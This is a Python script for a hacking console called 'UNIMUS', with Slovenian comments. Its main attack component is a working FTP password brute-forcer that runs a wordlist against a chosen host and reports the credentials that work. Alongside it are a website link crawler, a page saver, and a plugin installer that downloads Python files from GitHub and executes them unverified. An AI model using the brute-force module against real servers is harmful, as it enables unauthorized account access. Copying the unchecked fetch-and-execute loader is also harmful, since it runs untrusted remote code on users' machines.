import time
import requests
from ftplib import FTP
from colorama import Fore, Style, Back
import os
import signal
import importlib.util
from tabulate import tabulate
from urllib.parse import urljoin
from bs4 import BeautifulSoup

# Prepreči izhod programa s CTRL + C
def signal_handler(sig, frame):
    print("\n⚠️ use 'exit'.")
signal.signal(signal.SIGINT, signal_handler)

# Brisanje zaslona
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    ascii_art = """
 @@@  @@@ @@@  @@@ @@@ @@@@@@@@@@  @@@  @@@  @@@@@@
 @@!  @@@ @@!@!@@@ @@! @@! @@! @@! @@!  @@@ !@@    
 @!@  !@! @!@@!!@! !!@ @!! !!@ @!@ @!@  !@!  !@@!! 
 !!:  !!! !!:  !!! !!: !!:     !!: !!:  !!!     !:!
  :.:: :  ::    :  :    :      :    :.:: :  ::.: : 
    """
    print(Fore.RED + ascii_art + Style.RESET_ALL)
    print(Fore.CYAN + "Welcome to UNIMUS. Created by Tartilupa.\n" + Style.RESET_ALL)

# Brute force napad na FTP
def ftp_bruteforce_attack(target_host, target_port, username, wordlist):
    try:
        ftp = FTP()
        ftp.connect(target_host, target_port, timeout=10)
        print(f"🔌 Connected to FTP server {target_host}:{target_port}.")
        for password in wordlist:
            try:
                ftp.login(username, password.strip())
                print(Fore.GREEN + f"✅ Login successful: {username}:{password.strip()}" + Style.RESET_ALL)
                ftp.quit()
                return username, password.strip()
            except Exception:
                continue
        print(Fore.RED + "❌ Login failed with all passwords!" + Style.RESET_ALL)
        ftp.quit()
    except Exception as e:
        print(Fore.RED + f"❌ Connection error: {str(e)}" + Style.RESET_ALL)

# Pridobivanje povezav s spletne strani
def get_links(url, base_url, visited=None, depth=2):
    if visited is None:
        visited = set()
    
    if depth == 0 or url in visited:
        return {}
    
    visited.add(url)
    try:
        response = requests.get(url, timeout=5)
        response.raise_for_status()
    except requests.RequestException:
        return {}
    
    soup = BeautifulSoup(response.text, "html.parser")
    links = {}
    
    for link in soup.find_all("a", href=True):
        full_link = urljoin(base_url, link["href"])
        if full_link.startswith(base_url) and full_link not in visited:
            print(f"🔗 Found link: {full_link}")
            links[full_link] = get_links(full_link, base_url, visited, depth - 1)
    
    return {url: links}

# Shrani spletno stran
def freeze_web(url):
    print(f"📥 Saving webpage: {url}")
    try:
        response = requests.get(url, timeout=5)
        response.raise_for_status()
        filename = url.replace("https://", "").replace("http://", "").replace("/", "_") + ".html"
        with open(filename, "w", encoding="utf-8") as file:
            file.write(response.text)
        print(f"✅ Webpage saved as {filename}")
    except requests.RequestException:
        print(Fore.RED + "❌ Error saving the webpage!" + Style.RESET_ALL)

# Nalaganje modulov iz mods/
def load_modules():
    mods = {}
    mods_path = "mods"
    if not os.path.exists(mods_path):
        os.makedirs(mods_path)
    for file in os.listdir(mods_path):
        if file.endswith(".py"):
            mod_name = file[:-3]
            mod_path = os.path.join(mods_path, file)
            spec = importlib.util.spec_from_file_location(mod_name, mod_path)
            mod = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(mod)
            mods[mod_name] = mod
    return mods

# Namesti modul iz GitHub repozitorija
def install_module(name):
    GITHUB_USER = "tartilupa"
    raw_url = f"https://raw.githubusercontent.com/{GITHUB_USER}/{name}/main/{name}.py"
    mods_path = "mods"
    os.makedirs(mods_path, exist_ok=True)
    local_file = os.path.join(mods_path, f"{name}.py")
    
    try:
        print(f"⬇️  Downloading: {raw_url}")
        response = requests.get(raw_url)
        if response.status_code == 200:
            with open(local_file, "w", encoding="utf-8") as f:
                f.write(response.text)
            print(Fore.GREEN + f"✅ Module '{name}' installed successfully!" + Style.RESET_ALL)
        else:
            print(Fore.RED + f"❌ Failed to download module: HTTP {response.status_code}" + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"❌ Error: {str(e)}" + Style.RESET_ALL)

# Glavna funkcija
def main():
    print_banner()
    modules = load_modules()

    while True:
        choice_main = input(Fore.WHITE + Back.YELLOW + "root@localhost:~$" + Style.RESET_ALL + " ").strip()

        if choice_main == "package ftpbruteforce":
            config = {"host": None, "port": 21, "username": None, "wordlist": None}
            while True:
                command = input(Fore.BLUE + "ftpbruteforce> " + Style.RESET_ALL).strip()
                if command.startswith("set "):
                    key, value = command[4:].split(" ", 1)
                    if key in config:
                        config[key] = value
                        print(f"✅ {key} set to {value}")
                elif command == "show options":
                    print(tabulate(config.items(), headers=["Parameter", "Value"], tablefmt="fancy_grid"))
                elif command == "run":
                    if None in config.values():
                        print(Fore.RED + "❌ Missing parameters!" + Style.RESET_ALL)
                    else:
                        with open(config["wordlist"], "r") as file:
                            ftp_bruteforce_attack(config["host"], int(config["port"]), config["username"], file.readlines())
                elif command == "back":
                    break

        elif choice_main == "package webtree":
            config = {"url": None, "depth": 2}
            while True:
                command = input(Fore.BLUE + "webtree> " + Style.RESET_ALL).strip()
                if command.startswith("set "):
                    key, value = command[4:].split(" ", 1)
                    if key in config:
                        config[key] = int(value) if key == "depth" else value
                        print(f"✅ {key} set to {value}")
                elif command == "show options":
                    print(tabulate(config.items(), headers=["Parameter", "Value"], tablefmt="fancy_grid"))
                elif command == "run":
                    if not config["url"]:
                        print(Fore.RED + "❌ Missing parameters!" + Style.RESET_ALL)
                    else:
                        print("🔍 Scanning links...")
                        print(get_links(config["url"], config["url"], depth=config["depth"]))
                elif command == "back":
                    break

        elif choice_main.startswith("package install "):
            name = choice_main.split(" ", 2)[2]
            install_module(name)
            modules = load_modules()

        elif choice_main.startswith("pkg "):
            mod_name = choice_main.split(" ", 1)[1]
            if mod_name in modules:
                modules[mod_name].run()
            else:
                print(Fore.RED + f"❌ Module '{mod_name}' not found!" + Style.RESET_ALL)

        elif choice_main == "exit":
            print("Exiting program...")
            break
        elif choice_main == "clear":
            clear_screen()
        else:
            print(Fore.RED + "Unknown command!" + Style.RESET_ALL)

if __name__ == "__main__":
    main()
